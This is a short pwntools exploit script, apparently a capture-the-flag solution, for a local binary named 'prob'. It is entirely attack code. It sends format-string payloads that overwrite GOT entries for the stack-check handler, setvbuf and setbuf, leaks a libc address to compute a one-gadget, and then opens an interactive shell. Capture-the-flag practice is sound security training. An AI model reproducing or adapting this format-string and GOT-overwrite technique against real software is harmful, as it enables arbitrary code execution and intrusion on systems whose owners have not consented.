from pwn import *

io = process('./prob')

#stchk -> main
stchk = 0x404018
pld = b"%4595c%8$hn".ljust(0x10, b'\x00')
pld += p64(stchk)
pld = pld.ljust(80,b'\x00')
io.sendafter(b'>', pld)

sleep(1)
#leak
pld = b"%29$p".ljust(0x10, b'\x00')
pld = pld.ljust(80,b'\x00')
io.sendafter(b'>', pld)
io.recvn(1)
off = 0x29d90
leak = int(io.recvn(14),16) - off

sleep(1) 

print(b'[+] libc : ', hex(leak))
og = leak + 0xebc88
print(b'[+] og : ', hex(og))
gg = leak + 0xa8558
#setvbuf->gadget
setvbuf = 0x404038
pld = f"%{gg & 0xffff}c%8$hn".encode().ljust(0x10, b'\x00')
pld += p64(setvbuf)
pld = pld.ljust(80,b'\x00')
io.sendafter(b'>', pld)

sleep(1)
pld = f"%{(gg>>8*2) & 0xffff}c%8$hn".encode().ljust(0x10, b'\x00')
pld += p64(setvbuf+2)
pld = pld.ljust(80,b'\x00')
io.sendafter(b'>', pld)

sleep(1)
#setbuf->one gadget
setbuf = 0x404020
pld = f"%{og & 0xffff}c%8$hn".encode().ljust(0x10, b'\x00')
pld += p64(setbuf)
pld = pld.ljust(80,b'\x00')
io.sendafter(b'>', pld)

sleep(1)

pld = f"%{(og>>8*2) & 0xffff}c%8$hn".encode().ljust(0x10, b'\x00')
pld += p64(setbuf+2)
pld = pld.ljust(80,b'\x00')
io.sendafter(b'>', pld)

pause()
#stchk->init
pld = b"%4534c%8$hn".ljust(0x10, b'\x00')
pld += p64(stchk)
pld = pld.ljust(80,b'\x00')
io.sendlineafter(b'>', pld)

io.interactive()
